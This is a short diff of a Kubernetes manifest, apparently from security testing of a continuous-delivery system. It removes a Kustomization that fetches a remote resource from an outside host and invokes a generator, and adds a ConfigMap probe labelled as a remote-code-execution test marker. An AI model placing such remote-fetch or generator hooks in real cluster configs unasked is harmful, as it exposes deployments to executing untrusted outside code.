@@ -1,7 +1,9 @@
-apiVersion: kustomize.config.k8s.io/v1beta1
-kind: Kustomization
-resources:
-  - canary.yaml
-  - https://sfg.0x79.de/TESTFLO-KUSTOMIZE-FETCH.yaml
-generators:
-  - kustomize/generator.yaml
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: testflo-kustomize-probe
+  namespace: mt-cd78cd0c
+  labels:
+    app: testflo-rce
+data:
+  probe: "rce-v52"
